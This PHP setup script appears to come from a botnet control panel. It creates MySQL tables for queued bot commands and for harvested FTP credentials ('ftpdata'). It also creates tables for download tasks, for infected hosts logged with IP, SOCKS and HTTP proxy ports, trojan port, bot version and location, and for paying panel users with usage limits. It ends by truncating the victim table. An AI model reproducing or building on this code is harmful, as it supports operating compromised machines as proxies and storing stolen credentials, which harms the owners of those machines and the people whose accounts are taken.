<?php
session_start();
error_reporting (1);
include('dll/dll_Set.php');
include('dll/dll_MySQL.php');
include('dll/dll_Handle.php');




$quer="
CREATE TABLE IF NOT EXISTS `commands` (
  `id` int(11) NOT NULL auto_increment,
  `op` int(1) default NULL,
  `uid` varchar(50) default NULL,
  `command` text collate cp1251_bin,
  `ide` int(11) default NULL,
  `ctry` text NOT NULL,
  `tbl` int(12) NOT NULL default '0',
  `climit` int(10) NOT NULL default '0',
  `dn` int(1) NOT NULL default '0',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251 COLLATE=cp1251_bin  ;
";

OnMySQLQuery($quer,1); 

$quer="
CREATE TABLE IF NOT EXISTS `ftp` (
  `ftpdata` varchar(100) NOT NULL default '',
  `old` int(1) NOT NULL default '0',
  UNIQUE KEY `ftpdata` (`ftpdata`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251 COLLATE=cp1251_bin;
";
OnMySQLQuery($quer,1); 

$quer="
CREATE TABLE IF NOT EXISTS `dld` (
`id` INT( 10 ) NOT NULL AUTO_INCREMENT ,
`dld` VARCHAR( 256 ) NOT NULL ,
`cnt` INT( 12 ) NOT NULL ,
`lid` varchar(32) NOT NULL default '',
`dtbl` varchar(20) NOT NULL default '',
PRIMARY KEY ( `id` )
) ENGINE = MYISAM ;
";
OnMySQLQuery($quer,1); 


$quer="
CREATE TABLE IF NOT EXISTS `db_lohov` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `id2` bigint(20) default NULL,
  `ip_addres` varchar(20) default NULL,
  `real_ip_addr` varchar(20) default NULL,
  `lastuse` int(10) default NULL,
  `socks_port` int(10) default NULL,
  `http_port` int(10) default NULL,
  `port_check` tinyint(1) default '0',
  `time_reply` decimal(3,2) NOT NULL default '0.00',
  `remote_host` text collate cp1251_bin,
  `up_time_h` int(2) default NULL,
  `up_time_m` int(2) default NULL,
  `user_online` bigint(10) NOT NULL default '0',
  `troy_port` int(5) default NULL,
  `ver` varchar(255) default NULL,
  `uid` varchar(255) default NULL,
  `lang` varchar(7) NOT NULL default '-',
  `add_date` datetime default NULL,
  `country` varchar(255) NOT NULL default '-',
  `csht` varchar(2) NOT NULL default '-',
  `state` varchar(255) NOT NULL default '-',
  `city` varchar(255) NOT NULL default '-',
  `info` text NOT NULL,
  PRIMARY KEY  (`id`),
  UNIQUE KEY `uid` (`uid`),
  KEY `id` (`id`),
  KEY `ip_addres` (`ip_addres`),
  KEY `city` (`city`),
  KEY `state` (`state`),
  KEY `country` (`country`)
) ENGINE=MyISAM AUTO_INCREMENT=1 ;
";
OnMySQLQuery($quer,1); 

$quer="
CREATE TABLE IF NOT EXISTS `tbl_users` (
  `ID` int(10) NOT NULL auto_increment,
  `strUsername` varchar(32) NOT NULL default '',
  `strPassword` varchar(32) NOT NULL default '',
  `bBlocked` int(1) NOT NULL default '0',
  `nTill` int(10) NOT NULL default '0',
  `nLimit` int(15) NOT NULL default '0',
  `nViewed` int(15) NOT NULL default '0',
  `dlimit` int(5) NOT NULL default '0',
  `nLastLogin` int(10) NOT NULL default '0',
  `nUserIP` bigint(12) NOT NULL default '0',
  `nUserUIN` int(10) NOT NULL default '0',
  `lgn` int(1) NOT NULL default '0',
  PRIMARY KEY  (`ID`)
) ENGINE=MyISAM AUTO_INCREMENT=1 ;
";
OnMySQLQuery($quer,1); 



OnMySQLQuery("truncate db_lohov",1); 

exit;
?>